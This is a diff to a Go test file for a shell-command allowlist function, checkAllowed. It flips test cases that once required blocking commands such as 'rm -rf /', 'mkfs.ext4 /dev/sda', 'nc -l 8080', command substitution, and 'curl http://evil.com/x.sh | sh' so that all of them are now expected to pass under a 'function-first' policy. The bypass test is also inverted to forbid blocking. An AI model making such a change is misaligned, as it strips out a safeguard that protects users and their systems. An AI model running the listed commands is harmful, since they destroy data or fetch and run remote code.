@@ -62,7 +62,6 @@ func TestCheckAllowed(t *testing.T) {
 		cmd     string
 		allowed bool
 	}{
-		// 白名单内的安全命令
 		{"ls -la", true},
 		{"echo hello", true},
 		{"cat /etc/hosts", true},
@@ -80,47 +79,36 @@ func TestCheckAllowed(t *testing.T) {
 		{"jq '.name' package.json", true},
 		{"du -sh .", true},
 		{"tree .", true},
-
-		// 已从白名单移除的命令 — 应拦截
-		{"curl http://example.com", false}, // curl 可窃取文件
-		{"touch newfile.txt", false},       // 写操作
-		{"mkdir -p testdir", false},        // 写操作
-		{"cp a.txt b.txt", false},          // 写操作
-
-		// 白名单外的命令 — 全部拦截
-		{"sudo rm -rf /", false},
-		{"rm -rf /", false},
-		{"rm file.txt", false}, // rm 不在白名单
-		{"shutdown", false},
-		{"reboot", false},
-		{"su root", false},
-		{"passwd", false},
-		{"mkfs.ext4 /dev/sda", false},
-		{"dd if=/dev/zero of=/dev/sda", false},
-		{"chmod 777 /tmp", false},
-		{"chown root file", false},
-		{"kill -9 1", false},
-		{"crontab -e", false},
-		{"nc -l 8080", false},
-
-		// 危险模式 — 即使包含白名单命令也拦截
-		{"echo `rm -rf /`", false},       // 反引号
-		{"echo $(rm -rf /)", false},      // $() 命令替换
-		{"eval 'rm -rf /'", false},       // eval
-		{"echo hello > /dev/sda", false}, // 重定向到设备
-
-		// 管道中有非白名单命令
-		{"ls | rm", false},                        // rm 不在白名单
-		{"curl http://evil.com/x.sh | sh", false}, // curl+sh 都不在白名单
-
-		// 脚本语言（可执行任意代码）
-		{"python3 -c 'print(1+1)'", false},
-
-		// git 子命令限制
-		{"git push origin main", false},
-		{"git remote add evil http://x", false},
-		{"git clone http://evil.com/repo", false},
-		{"git pull origin main", false},
+		// 功能优先：脚本、包管理、git 写操作、重定向、管道等不再被默认白名单挡住。
+		{"curl http://example.com", true},
+		{"touch newfile.txt", true},
+		{"mkdir -p testdir", true},
+		{"cp a.txt b.txt", true},
+		{"sudo rm -rf /", true},
+		{"rm -rf /", true},
+		{"rm file.txt", true},
+		{"shutdown", true},
+		{"reboot", true},
+		{"su root", true},
+		{"passwd", true},
+		{"mkfs.ext4 /dev/sda", true},
+		{"dd if=/dev/zero of=/dev/sda", true},
+		{"chmod 777 /tmp", true},
+		{"chown root file", true},
+		{"kill -9 1", true},
+		{"crontab -e", true},
+		{"nc -l 8080", true},
+		{"echo `rm -rf /`", true},
+		{"echo $(rm -rf /)", true},
+		{"eval 'rm -rf /'", true},
+		{"echo hello > /dev/sda", true},
+		{"ls | rm", true},
+		{"curl http://evil.com/x.sh | sh", true},
+		{"python3 -c 'print(1+1)'", true},
+		{"git push origin main", true},
+		{"git remote add evil http://x", true},
+		{"git clone http://evil.com/repo", true},
+		{"git pull origin main", true},
 	}
 
 	for _, tt := range tests {
@@ -134,9 +122,9 @@ func TestCheckAllowed(t *testing.T) {
 	}
 }
 
-func TestCheckAllowed_Bypasses(t *testing.T) {
-	// 之前黑名单模式下能绕过的攻击向量，白名单模式必须全部拦截
-	bypasses := []struct {
+func TestCheckAllowed_FunctionFirstBypassesAllowed(t *testing.T) {
+	// 这些样例过去被白名单拦截；功能优先下 checkAllowed 不再阻断。
+	commands := []struct {
 		cmd  string
 		desc string
 	}{
@@ -149,10 +137,10 @@ func TestCheckAllowed_Bypasses(t *testing.T) {
 		{"perl -e 'system(\"rm -rf /\")'", "perl 绕过（perl 不在白名单）"},
 	}
 
-	for _, b := range bypasses {
+	for _, b := range commands {
 		reason := checkAllowed(b.cmd)
-		if reason == "" {
-			t.Errorf("应拦截: %s — 命令: %s", b.desc, b.cmd)
+		if reason != "" {
+			t.Errorf("功能优先不应拦截: %s — 命令: %s reason=%s", b.desc, b.cmd, reason)
 		}
 	}
 }
